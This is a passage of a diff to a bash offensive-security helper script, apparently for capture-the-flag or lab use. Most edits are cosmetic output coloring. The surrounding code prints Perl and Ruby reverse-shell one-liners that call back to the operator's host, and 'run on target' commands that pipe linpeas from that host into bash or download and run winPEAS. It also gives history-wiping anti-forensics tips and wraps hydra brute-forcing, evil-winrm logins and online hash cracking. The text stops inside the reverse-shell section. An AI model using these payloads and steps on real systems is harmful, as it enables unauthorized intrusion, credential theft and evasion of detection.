@@ -4,8 +4,20 @@ IFS=$'\n\t'
 
 # Uncomment for Debugging
 #set -x
+# Text color variables
+#txtund=$(tput sgr 0 1)          # Underline
+txtbld=$(tput bold)             # Bold
+bldred=${txtbld}$(tput setaf 1) #  red
+bldblu=${txtbld}$(tput setaf 4) #  blue
+bldwht=${txtbld}$(tput setaf 7) #  white
+txtrst=$(tput sgr0)             # Reset
+info="${bldwht}\[*\]${txtrst}"    # Feedback
+#pass="${bldblu}\[*\]${txtrst}"
+warn="${bldred}\[!\]${txtrst}"
+ques="${bldblu}\[?\]${txtrst}"
+
 prompt() {
-  read -p "[?] Run command? (y/N): " -n 1 -r
+  read -p "${ques} ${bldwht}Run command? (y/N): ${txtrst}" -n 1 -r
   echo
   if [[ ! "$REPLY" =~ ^[Yy]$ ]]; then
     exit
@@ -31,9 +43,9 @@ showHelp() {
 INSTCMD=""
 checkCmd() {
   if [ ! "$(which "$CMD")" ]; then
-    echo "[!] '$CMD' required but missing."
+    echo "${warn} '$CMD' required but missing."
     if [ -n "$INSTCMD" ]; then
-      echo "> $INSTCMD"; prompt; bash -c "$INSTCMD";
+      echo "${bldwht}> $INSTCMD${txtrst}"; prompt; bash -c "$INSTCMD";
     else
       exit
     fi
@@ -49,18 +61,18 @@ getIP() {
 
   IP=$(ip -4 addr show "$DEV" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
   if [ -z "$IP" ]; then
-    echo "[!] Error getting IP. Stale tun0 device?"; exit
+    echo "${warn} Error getting IP. Stale tun0 device?"; exit
   fi
-  echo "$IP"
+  echo -n "$IP"
 }
 
 getExtIP() {
-  EXTIP=$(curl ifconfig.me)
+  EXTIP=$(curl -s ifconfig.me)
   # curl api.ipify.org
   # curl ipinfo.io/ip
   # curl wtfismyip.com/text
   # curl checkip.amazonaws.com
-  echo "$EXTIP"
+  echo -n "$EXTIP"
 }
 
 showCreds() {
@@ -70,7 +82,7 @@ showCreds() {
   if [ -e "$FILE" ]; then
     column -t -s':' "$FILE" | cat -n
   else
-    echo -e "\n[*] No '$FILE' found!"
+    echo -e "\n${warn} No '$FILE' found!"
   fi
   exit
 }
@@ -82,10 +94,10 @@ getCreds() {
   else
     FILE="creds.txt"
     if [ ! -e "$FILE" ]; then
-      echo "[!] No '$FILE' found!"; exit
+      echo "${warn} No '$FILE' found!"; exit
     fi
     if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ]; then
-      echo "[!] Invalid credential ID!"; exit
+      echo "${warn} Invalid credential ID!"; exit
     fi
 
     USRNME=$(sed -n "${CID}p" "$FILE" | cut -d':' -f1)
@@ -97,7 +109,7 @@ getCreds() {
 createUserPassLists() {
   FILE="creds.txt"
   if [ ! -e "$FILE" ]; then
-    echo "[!] No '$FILE' found!"; exit
+    echo "${warn} No '$FILE' found!"; exit
   fi
   FPATH="/dev/shm/.fxy"
   if [ ! -d "$FPATH" ]; then
@@ -107,7 +119,7 @@ createUserPassLists() {
   if [ "$(which "userlstgen.py")" ]; then
     genuserlst.py "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u > "$FPATH/user.lst"
   else
-    echo "[*] Did not find 'genuserlst.py' in PATH. Falling back to simple mode."
+    echo "${info} Did not find 'genuserlst.py' in PATH. Falling back to simple mode."
     cut -d: -f1 "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u | grep -v ^$ > "$FPATH/user.lst"
   fi
   # passlist
@@ -133,7 +145,7 @@ if [ "$#" -eq 2 ] && [[ "$1" =~ ^r(host)?$ ]]; then
     fi
     echo "$2" > $FILE
   else
-    echo "[!] You need to supply an IP or hostname as second argument!"
+    echo "${warn} You need to supply an IP or hostname as second argument!"
   fi
   exit
 fi
@@ -193,7 +205,7 @@ if [ -f $FILE ]; then
   export USRAGENT
 
   if [ -z "$USRAGENT" ]; then
-     echo "[!] Something went wrong on loading '$FILE'"
+     echo "${warn} Something went wrong on loading '$FILE'"
      USRAGENT="$DEFAULTUA"
      export USRAGENT
   fi
@@ -213,7 +225,7 @@ if [[ "$1" =~ ^b(ase)?64(e|d)?$ ]] && [ "$#" -eq 2 ]; then
   case "$1" in
     "b64"|"b64e"|"base64"|"base64e")  echo -n "$2" | base64; echo; exit ;;
     "b64d"|"base64d")                 echo -n "$2" | base64 -d; echo; exit ;;
-    *)                                echo "[!] Error parsing type of operation!"; exit ;;
+    *)                                echo "${warn} Error parsing type of operation!"; exit ;;
   esac
 fi
 ## cewl [s|ssl|tls] [subdir]^: cewl PROTO://RHOST+SUBDIR -w RHOST_cewl.txt
@@ -236,7 +248,7 @@ if [ "$1" == "cewl" ]; then
   fi
 
   CMD="$CMD $PROTO://${RHOST}${SUBDIR} -w ${RHOST}_cewl.txt"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -249,7 +261,7 @@ if [[ "$1" =~ ^c(i|y)ph(ey)?$ ]] && [ "$#" -eq 2 ]; then
 
   INPUT="$2"
   CMD="$CMD -t '$INPUT'"
-  echo "> $CMD"; prompt; bash -c "$CMD";
+  echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD";
   exit
 fi
 ## cme|crackmapexec [smb]^: crackmapexec smb RHOST | tee
@@ -261,7 +273,7 @@ if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
     exit
   fi
   CMD="$CMD $RHOST | tee ${RHOST}_cme_$(date +%F_%H%M%S).log"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -282,17 +294,17 @@ if [ "$1" == "creds" ]; then
     # del entry
     CID="$3"
     if [ ! -e "$FILE" ]; then
-      echo "[!] No '$FILE' found!"; exit
+      echo "${warn} No '$FILE' found!"; exit
     fi
     if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ] || [ "$CID" -eq 0 ]; then
-      echo "[!] Invalid credential ID!"; exit
+      echo "${warn} Invalid credential ID!"; exit
     fi
     CMD="sed -i '${CID}d' $FILE"
   elif [ "$2" == "edit" ]; then
     nano "$FILE"
     exit
   fi
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -317,7 +329,7 @@ if [ "$1" == "curl" ]; then
   fi
 
   CMD="$CMD -ski -A '$USRAGENT' $PROTO://${RHOST}${SUBDIR} | less"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -334,7 +346,7 @@ if [ "$1" == "chef" ] || [ "$1" == "cyberchef" ]; then
     exit
   fi
 
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -359,7 +371,7 @@ if [ "$1" == "dirb" ]; then
   fi
 
   CMD="$CMD $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -381,7 +393,7 @@ if [ "$1" == "evil-winrm" ] || [ "$1" == "winrm" ]; then
   fi
 
   CMD="$CMD -i $RHOST -u '$USRNME' -p '$PASSWD'"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -398,13 +410,13 @@ if [[ "$1" =~ ^fix$ ]] && [ "$#" -eq 2 ]; then
     done
   elif [[ "$2" =~ ^pip(3)?$ ]]; then
     CMD="/usr/bin/python3 -m pip install --upgrade pip"
-    echo "> $CMD"; prompt; bash -c "$CMD"
+    echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
   elif [[ "$2" =~ ^py(3)?|python(3)?$ ]]; then
     CMD="pip list --outdated --format=freeze | cut -d'=' -f1 | xargs -n1 pip install --upgrade"
-    echo "> $CMD"; prompt; bash -c "$CMD"
+    echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
   elif [[ "$2" =~ ^sys(tem)?$ ]]; then
       CMD="apt update && apt dist-upgrade -y"
-      echo "> $CMD"; prompt; bash -c "$CMD"
+      echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
   fi
   exit
 fi
@@ -413,9 +425,9 @@ if { [ "$1" == "hashcrack" ] || [ "$1" == "hc" ]; } && [ "$#" -eq 3 ]; then
   WRDLST="/usr/share/wordlists/rockyou.txt"
   if [ ! -f "$WRDLST" ]; then
     if [ -e "$WRDLST.gz" ]; then
-      echo "[?] rockyou still zipped. Unzip?"
+      echo "${ques} rockyou still zipped. Unzip?"
       CMD="gunzip $WRDLST.gz"
-      echo "> $CMD"; prompt; bash -c "$CMD"
+      echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
     else
       WRDLST="/path/to/my/wrdlst"
     fi
@@ -427,7 +439,7 @@ if { [ "$1" == "hashcrack" ] || [ "$1" == "hc" ]; } && [ "$#" -eq 3 ]; then
     "sha"|"sha1")       JTYPE="raw-sha1" ;;
     "sha256"|"sha2")    JTYPE="raw-sha256" ;;
     "sha512"|"sha5")    JTYPE="raw-sha512" ;;
-    *)                  echo "[!] Error parsing type of hash!"; exit ;;
+    *)                  echo "${warn} Error parsing type of hash!"; exit ;;
   esac
 
   HASH="$3"
@@ -461,7 +473,7 @@ if { [[ "$1" =~ ^md5|sha(1)?|sha2(56)?|sha3(84)?|sha5(12)?$ ]]; } && [ "$#" -ge 
     "sha256"|"sha2")    CMD="sha256sum" ;;
     "sha384"|"sha3")    CMD="sha384sum" ;;
     "sha512"|"sha5")    CMD="sha512sum" ;;
-    *)                  echo "[!] Error parsing type of hash!"; exit ;;
+    *)                  echo "${warn} Error parsing type of hash!"; exit ;;
   esac
 
   checkCmd
@@ -489,52 +501,52 @@ if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 1 ]; then
   exit
 fi
 
-if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
+if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -ge 3 ]; then
   HASH="$3"
 
   case "$2" in
     "md5")              TYPE="md5";
-                        [[ "$HASH" =~ ^[A-Za-z0-9]{32}$ ]] || { echo '[!] Invalid MD5 Hash!'; exit; };
-                        [ "$HASH" == 'd41d8cd98f00b204e9800998ecf8427e' ] && { echo '[!] Empty MD5 Hash!'; exit; } ;;
+                        [[ "$HASH" =~ ^[A-Za-z0-9]{32}$ ]] || { echo "${warn} Invalid MD5 Hash!"; exit; };
+                        [ "$HASH" == 'd41d8cd98f00b204e9800998ecf8427e' ] && { echo "${warn} Empty MD5 Hash!"; exit; } ;;
     "sha"|"sha1")       TYPE="sha1";
-                        [[ "$HASH" =~ ^[A-Za-z0-9]{40}$ ]] || { echo '[!] Invalid SHA1 Hash!'; exit; };
-                        [ "$HASH" == 'da39a3ee5e6b4b0d3255bfef95601890afd80709' ] && { echo '[!] Empty SHA1 Hash!'; exit; } ;;
+                        [[ "$HASH" =~ ^[A-Za-z0-9]{40}$ ]] || { echo "${warn} Invalid SHA1 Hash!"; exit; };
+                        [ "$HASH" == 'da39a3ee5e6b4b0d3255bfef95601890afd80709' ] && { echo "${warn} Empty SHA1 Hash!"; exit; } ;;
 
     "sha256"|"sha2")    TYPE="sha256";
-                        [[ "$HASH" =~ ^[A-Za-z0-9]{64}$ ]] || { echo '[!] Invalid SHA256 Hash!'; exit; };
-                        [ "$HASH" == 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' ] && { echo '[!] Empty SHA256 Hash!'; exit; } ;;
+                        [[ "$HASH" =~ ^[A-Za-z0-9]{64}$ ]] || { echo "${warn} Invalid SHA256 Hash!"; exit; };
+                        [ "$HASH" == 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' ] && { echo "${warn} Empty SHA256 Hash!"; exit; } ;;
 
     "sha384"|"sha3")    TYPE="sha384";
-                        [[ "$HASH" =~ ^[A-Za-z0-9]{96}$ ]] || { echo '[!] Invalid SHA384 Hash!'; exit; };
-                        [ "$HASH" == '38b060a751ac96384cd9327eb1b1e36a21fdb71114be07434c0cc7bf63f6e1da274edebfe76f65fbd51ad2f14898b95b' ] && { echo '[!] Empty SHA384 Hash!'; exit; } ;;
+                        [[ "$HASH" =~ ^[A-Za-z0-9]{96}$ ]] || { echo "${warn} Invalid SHA384 Hash!"; exit; };
+                        [ "$HASH" == '38b060a751ac96384cd9327eb1b1e36a21fdb71114be07434c0cc7bf63f6e1da274edebfe76f65fbd51ad2f14898b95b' ] && { echo "${warn} Empty SHA384 Hash!"; exit; } ;;
 
     "sha512"|"sha5")    TYPE="sha512";
-                        [[ "$HASH" =~ ^[A-Za-z0-9]{128}$ ]] || { echo '[!] Invalid SHA512 Hash!'; exit; };
-                        [ "$HASH" == 'cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e' ] && { echo '[!] Empty SHA512 Hash!'; exit; } ;;
+                        [[ "$HASH" =~ ^[A-Za-z0-9]{128}$ ]] || { echo "${warn} Invalid SHA512 Hash!"; exit; };
+                        [ "$HASH" == 'cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e' ] && { echo "${warn} Empty SHA512 Hash!"; exit; } ;;
 
     "lm"|"LM")          TYPE="lm";
-                        [[ "$HASH" =~ ^[A-Za-z0-9]{16,32}$ ]] || { echo '[!] 111 Invalid LM Hash!'; exit; };
-                        [ "$HASH" == 'aad3b435b51404ee' ] && { echo '[!] Empty LM Hash!'; exit; } ;;
+                        [[ "$HASH" =~ ^[A-Za-z0-9]{16,32}$ ]] || { echo "${warn} 111 Invalid LM Hash!"; exit; };
+                        [ "$HASH" == 'aad3b435b51404ee' ] && { echo "${warn} Empty LM Hash!"; exit; } ;;
 
     "nt"|"NT")          TYPE="nt";
-                        [[ "$HASH" =~ ^[A-Za-z0-9]{32}$ ]] || { echo '[!] Invalid NT Hash!'; exit; } ;;
+                        [[ "$HASH" =~ ^[A-Za-z0-9]{32}$ ]] || { echo "${warn} Invalid NT Hash!"; exit; } ;;
 
-    *)                  echo "[!] Error parsing type of hash!"; exit ;;
+    *)                  echo "${warn} Error parsing type of hash!"; exit ;;
   esac
 
-  sleep 3 #zZzZzZzZz
+  [ "${4-default}" == "q" ] || sleep 3
 
   # hashtoolkit.com
   if [[ "$TYPE" =~ ^md5|sha1|sha256|sha384|sha512$ ]]; then
     RES="$(curl -ski -A "$USRAGENT" https://hashtoolkit.com/reverse-"$TYPE"-hash/?hash="$HASH")"
 
     if [ -n "$(grep -i 'No hashes found for' <<< "$RES")" ]; then
-      echo "[!] (hashtoolkit.com) No match found!";
+      echo "${warn} (hashtoolkit.com) No match found!";
     else
       PASSWD="$(grep -m 1 -io "/generate-hash/?text=.*>" <<< "$RES" | cut -d'>' -f2 | sed 's,</a,,')"
       PASSWD="$(sed 's,&lt;,<,' <<< "$PASSWD")"
       PASSWD="$(sed 's,&gt;,>,' <<< "$PASSWD")"
-      echo "[*] (hashtoolkit.com) Match found: '$PASSWD'"; exit
+      echo "${info} (hashtoolkit.com) Match found: '$PASSWD'"; exit
     fi
   fi
 
@@ -543,14 +555,14 @@ if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
     case "$TYPE" in
       "md5")        RES="$(curl -ski -A "$USRAGENT" https://md5.gromweb.com/?md5="$HASH")" ;;
       "sha1")       RES="$(curl -ski -A "$USRAGENT" https://sha1.gromweb.com/?hash="$HASH")" ;;
-      *)            echo "[!] Error parsing type of hash!"; exit ;;
+      *)            echo "${warn} Error parsing type of hash!"; exit ;;
     esac
 
     PASSWD="$(grep -i "was succesfully reversed" -A1 <<< "$RES" | grep "long-content string" | cut -d'>' -f2 | sed 's,</em.*,,' )"
     if [ -z "$RES" ]; then
-      echo "[!] (gromweb.com) No match found!";
+      echo "${warn} (gromweb.com) No match found!";
     else
-      echo "[*] (gromweb.com) Match found: '$PASSWD'"; exit
+      echo "${info} (gromweb.com) Match found: '$PASSWD'"; exit
     fi
   fi
 
@@ -576,9 +588,9 @@ if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
 
     PASSWD="$(jq -r .msg <<< "$RES")"
     if [[  ! "$RES" =~ Password\ not\ found ]]; then
-      echo "[!] (objectif-securite.ch) No match found!";
+      echo "${warn} (objectif-securite.ch) No match found!";
     else
-      echo "[*] (objectif-securite.ch) Match found: '$PASSWD'"; exit
+      echo "${info} (objectif-securite.ch) Match found: '$PASSWD'"; exit
     fi
   fi
 
@@ -586,7 +598,7 @@ if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
   if [ "$TYPE" == "lm" ]; then
     HLEN="$(echo -n "$HASH" | wc -c)"
     if { [[ ! "$HASH" =~ ^[A-Za-z0-9]{16}$ ]] && [[ ! "$HASH" =~ ^[A-Za-z0-9]{32}$ ]]; } || [ "$HASH" == "aad3b435b51404ee" ]; then
-      echo "[!] Invalid LM Hash!"; exit
+      echo "${warn} Invalid LM Hash!"; exit
     fi
 
     HASHES="$(echo -n "$HASH" | cut -c1-16)"
@@ -613,15 +625,15 @@ if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
         --data-raw 'hashe='"$h"'&ifik=+Submit+&forma=tak')
 
       if [[ "$RES" =~ CRACKED ]]; then
-        PASSWD="${PASSWD}$(grep -o  'CRACKED&nbsp;</TD><TD>&nbsp;.*&nbsp;' <<< $RES | sed 's/.*&nbsp;\(.*\)&nbsp;/\1/')"
+        PASSWD="${PASSWD}$(grep -o  'CRACKED&nbsp;</TD><TD>&nbsp;.*&nbsp;' <<< "$RES" | sed 's/.*&nbsp;\(.*\)&nbsp;/\1/')"
       fi
 
     done
 
     if [ -n "$PASSWD" ]; then
-      echo "[*] (it64.com) Match found: '${PASSWD}'"; exit
+      echo "${info} (it64.com) Match found: '${PASSWD}'"; exit
     else
-      echo "[!] (it64.com) No match found!"
+      echo "${warn} (it64.com) No match found!"
     fi
   fi
 
@@ -630,21 +642,21 @@ if { [ "$1" == "hashsearch" ] || [ "$1" == "hs" ]; } && [ "$#" -eq 3 ]; then
     if [ "$TYPE" == "nt" ]; then TYPE="ntlm"; fi
     RES=$(curl -ski -A "$USRAGENT" "https://reverse-hash-lookup.online-domain-tools.com/" --data "text=$HASH&function=$TYPE&do=form-submit&phone=5deab72563840e7678c4067671849b85332d7438&send=%3E+Reverse!")
     if [ -n "$(grep -i 'You do not have enough credits in your account.' <<< "$RES")" ]; then
-      echo "[!] (online-domain-tools.com) No free credits left!";
+      echo "${warn} (online-domain-tools.com) No free credits left!";
     elif [ -n "$(grep -i 'Hash #1:</b> ERROR:' <<< "$RES")" ]; then
-      echo "[!] (online-domain-tools.com) No match found or error!";
+      echo "${warn} (online-domain-tools.com) No match found or error!";
     else
       PASSWD="$(grep -o -m 1 "Hash #1.*" <<< "$RES" | cut -d' ' -f3 | sed 's,</.*$,,')"
       PASSWD="$(sed 's,&lt;,<,' <<< "$PASSWD")"
       PASSWD="$(sed 's,&gt;,>,' <<< "$PASSWD")"
-      echo "[*] (online-domain-tools.com) Match found: '$PASSWD'"
+      echo "${info} (online-domain-tools.com) Match found: '$PASSWD'"
     fi
   fi
 
   # Still here?
   echo -e "\nNothing found so far. Want to do it manually on crackstation.net?"
   CMD="firefox 'https://crackstation.net'"
-  echo "> $CMD"; prompt; bash -c "$CMD"; exit
+  echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"; exit
 fi
 # 2DO:
 # - https://md5decrypt.net/en/Api/ - signup broken
@@ -663,7 +675,7 @@ if [ "$1" == "httpd" ] || [ "$1" == "ws" ] ; then
   for f in $(find . -maxdepth 1 -type f 2>/dev/null | sed 's,\./,,' | sed 's, ,+,'); do
     echo "- http://$(getIP)/$f";
   done
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
@@ -695,7 +707,7 @@ if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
     "ftp")              PORT="-s 21"; SVC="ftp" ;;
     "smb")              PORT="-s 445"; SVC="smb" ;;
     "http"|"http-get")  PORT="-s 80"; SVC="http-get"; SUBDIR="/" ;;
-    *)                  echo "[!] Error parsing service to attack!"; exit ;;
+    *)                  echo "${warn} Error parsing service to attack!"; exit ;;
   esac
 
   if [ "$#" -ge 3 ]; then
@@ -713,7 +725,7 @@ if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
   fi
 
   CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC $SUBDIR"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -724,25 +736,33 @@ if { [ "$1" == "iconv" ] || [ "$1" == "conv" ] || [ "$1" == "convert" ]; } && [ 
 
   FILE="$2"
   if [ ! -f "$FILE" ]; then
-    echo "[!] Invalid input file!"; exit
+    echo "${warn} Invalid input file!"; exit
   fi
 
   CMD="iconv -f UTF-16LE -t UTF-8 $FILE -o $FILE.conv"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
 fi
+## ip(s)^: Show interface and external IP(s)
+if [[ "$1" =~ ^ip(s)?$ ]]; then
+  CMD="ip"; checkCmd
+  ip a \
+    | sed -E 's/^[ ]{1,}//gm' \
+    | grep -E '^(.:|inet)' \
+    | cut -d' ' -f1-2 \
+    | sed 's,^inet,  inet,g'
+  echo "X: extip"
+  echo -n "  inet "; getExtIP; echo
+  exit
+fi
 ## ipwsh [port]^: Download InsecurePowerShell and serve via davserver
 if [ "$1" == "ipwsh" ]; then
-  echo "[?] Download InsecurePowerShell and serve via davserver?"; prompt
-  if [ ! "$(which davserver)" ]; then
-    echo "[!] 'davserver' required but missing."
-    CMD="sudo pip3 install PyWebDAV3"
-    echo "> $CMD";
-    prompt
-    bash -c "$CMD"
-  fi
+  echo "${ques} Download InsecurePowerShell and serve via davserver?"; prompt
+  CMD="davserver"
+  INSTCMD="sudo pip3 install PyWebDAV3"
+  checkCmd
 
   FPATH="/dev/shm/.fxy/ipwsh"
   if [ -d "$FPATH/pwsh" ]; then
@@ -761,28 +781,28 @@ if [ "$1" == "ipwsh" ]; then
     PORT="$2"
   fi
 
-  echo -e "\n$(tput bold)[*] Run this on your target:"
+  echo -e "\n${info}${txtbld} Run this on your target:"
 
   if [ "$PORT" -eq 80 ]; then
     echo "  \\\\$(getIP)\DavWWWRoot\pwsh\pwsh.exe"
   else
     echo "  \\\\$(getIP)@$PORT\DavWWWRoot\pwsh\pwsh.exe"
   fi
-  echo "$(tput sgr0) "
+  echo "${txtrst}"
 
   CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH -n"
-  echo "> $CMD";
+  echo "${bldwht}> $CMD${txtrst}";
   bash -c "$CMD"
   exit
 fi
 # 2DO:
 # - Somehow ipwsh can't access c:\
-## len(gth) [INPUT]^: Show length of input
+## len(gth) [input]^: Show length of input
 if [[ "$1" =~ ^len(gth)?$ ]] && [ "$#" -ge 2 ]; then
   CMD="wc"; checkCmd
   INPUT="$(echo -n "$@" | cut -d' ' -f2-)"
   CMD="echo -n '$INPUT' | wc -c"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
@@ -796,7 +816,7 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   fi
   CMD="$CMD -vlkp $PORT"
   # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
-  echo "[*] Shell upgrade instructions:"
+  echo "${info} Shell upgrade instructions:"
   echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
   echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
   echo "    Ctrl-z"
@@ -807,11 +827,11 @@ if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
   COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
   echo -e " stty rows $ROWS columns $COLS\n"
   # https://attack.mitre.org/techniques/T1070/003/
-  echo "[*] OPSEC Linux:"
+  echo "${info} OPSEC Linux:"
   echo "    unset HISTFILE; export HISTFILESIZE=0;"
   echo "    # make sure to check history before deleting!"
   echo -e "    history -c; rm ~/.bash_history\n"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
@@ -819,7 +839,7 @@ fi
 if [ "$1" == "nfs" ] || [ "$1" == "showmount" ]; then
   CMD="showmount"; checkCmd
   CMD="showmount -e $RHOST"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -844,7 +864,7 @@ if [ "$1" == "nikto" ]; then
   fi
 
   CMD="$CMD -host $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -856,7 +876,7 @@ if [ "$1" == "n" ] || [ "$1" == "nmap" ]; then
     CMD="$CMD -p-"
   fi
   CMD="$CMD -v -A $RHOST -oA ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S)"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -880,7 +900,7 @@ if [ "$1" == "peas" ] && [ "$#" -eq 1 ]; then
 fi
 
 if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "winany" ] || [ "$2" == "winbat" ] || [ "$2" == "win86" ] || [ "$2" == "win64" ]; }; then
-  echo "[?] Download *peas and serve via http.server?"; prompt
+  echo "${ques} Download *peas and serve via http.server?"; prompt
 
   FPATH="/dev/shm/.fxy/peas"
   if [ ! -d "$FPATH" ]; then
@@ -894,7 +914,7 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
     "winany")    wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe' -O "$FPATH/winPEASany.exe" ;;
     "win86")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O "$FPATH/winPEASx86.exe" ;;
     "win64")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O "$FPATH/winPEASx64.exe" ;;
-    *)           echo "[!] Error parsing PEAS version for download!"; exit ;;
+    *)           echo "${warn} Error parsing PEAS version for download!"; exit ;;
   esac
 
   PORT="80"
@@ -903,7 +923,7 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
   fi
 
   CMD="python3 -m http.server $PORT"
-  echo "$(tput bold)[*] Run this on your target:"
+  echo "${info}${txtbld} Run this on your target:"
 
   case "$2" in
     "lin")       echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_\$(whoami).log" ;;
@@ -911,11 +931,11 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
     "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe;.\winPEASany.exe| tee winpeas.log" ;;
     "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe;.\winPEASx86.exe| tee winpeas.log" ;;
     "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe;.\winPEASx64.exe| tee winpeas.log"  ;;
-    *)           echo "[!] Error parsing PEAS version for help text!"; exit ;;
+    *)           echo "${warn} Error parsing PEAS version for help text!"; exit ;;
   esac
 
-  echo "$(tput sgr0) "
-  echo "> $CMD"
+  echo "${txtrst}"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
@@ -931,7 +951,7 @@ if [ "$1" == "p" ] || [ "$1" == "ping" ]; then
   fi
 
   CMD="$CMD $RHOST"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
@@ -967,13 +987,13 @@ if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
     "perl")                         echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
     "ruby")                         echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
